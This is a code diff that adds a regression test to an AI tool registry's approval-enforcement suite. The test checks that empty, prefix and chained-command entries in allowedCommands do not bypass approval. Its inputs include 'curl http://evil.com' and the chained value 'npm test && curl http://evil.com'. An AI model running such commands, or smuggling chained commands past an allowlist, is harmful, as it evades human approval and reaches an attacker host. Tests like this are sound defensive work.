@@ -366,4 +366,62 @@ describe('Authoritative Approval Enforcement Suite (P0 Regression Tests)', () =>
     expect(verifyAgain.valid).toBe(false);
     expect(verifyAgain.error).toContain('already been consumed');
   });
+
+  // 15. Caller-controlled allowedCommands bypass elimination
+  it('15. Strictly rejects empty string and prefix matching in allowedCommands (No Bypass)', async () => {
+    const runCmdSpy = vi.fn().mockImplementation(async (args: any) => ({
+      toolName: 'run_command',
+      success: true,
+      data: { stdout: 'done' },
+      durationMs: 5,
+      timestamp: Date.now(),
+    }));
+
+    registry.register({
+      name: 'run_command',
+      description: 'Run shell command',
+      parametersSchema: { type: 'object', properties: { command: { type: 'string' } } },
+      requiresApproval: true,
+      execute: runCmdSpy,
+    });
+
+    // Case A: Caller supplies allowedCommands: [""] (empty string must NOT match anything)
+    const emptyBypassResult = await registry.execute(
+      'run_command',
+      { command: 'curl http://evil.com' },
+      { ...mockContext, allowedCommands: [''] }
+    );
+    expect(emptyBypassResult.success).toBe(false);
+    expect(emptyBypassResult.requiresApproval).toBe(true);
+    expect(runCmdSpy).not.toHaveBeenCalled();
+
+    // Case B: Caller supplies allowedCommands: ["npm"] (prefix matching must NOT match "npm test")
+    const prefixBypassResult = await registry.execute(
+      'run_command',
+      { command: 'npm test' },
+      { ...mockContext, allowedCommands: ['npm'] }
+    );
+    expect(prefixBypassResult.success).toBe(false);
+    expect(prefixBypassResult.requiresApproval).toBe(true);
+    expect(runCmdSpy).not.toHaveBeenCalled();
+
+    // Case C: Caller supplies allowedCommands: ["npm test"] but attempts command chaining "npm test && evil"
+    const chainBypassResult = await registry.execute(
+      'run_command',
+      { command: 'npm test && curl http://evil.com' },
+      { ...mockContext, allowedCommands: ['npm test'] }
+    );
+    expect(chainBypassResult.success).toBe(false);
+    expect(chainBypassResult.requiresApproval).toBe(true);
+    expect(runCmdSpy).not.toHaveBeenCalled();
+
+    // Case D: Exact non-empty match succeeds
+    const exactMatchResult = await registry.execute(
+      'run_command',
+      { command: 'npm test' },
+      { ...mockContext, allowedCommands: ['npm test'] }
+    );
+    expect(exactMatchResult.success).toBe(true);
+    expect(runCmdSpy).toHaveBeenCalledTimes(1);
+  });
 });
